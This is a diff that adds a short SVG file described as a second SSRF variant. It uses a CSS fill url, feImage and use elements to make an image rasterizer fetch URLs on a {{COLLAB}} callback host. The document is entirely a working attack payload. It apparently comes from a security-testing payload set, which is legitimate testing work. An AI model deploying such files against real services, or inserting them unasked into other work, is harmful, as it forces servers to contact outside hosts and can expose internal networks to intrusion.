@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Second SVG SSRF variant: uses <use>/feImage + CSS background so it exercises
+     a different code path in the rasterizer than the built-in xlink:href one. -->
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink" width="64" height="64">
+  <style>image{fill:url(http://{{COLLAB}}/css-bg)}</style>
+  <feImage xlink:href="http://{{COLLAB}}/feimage"/>
+  <use xlink:href="http://{{COLLAB}}/use.svg#x"/>
+</svg>
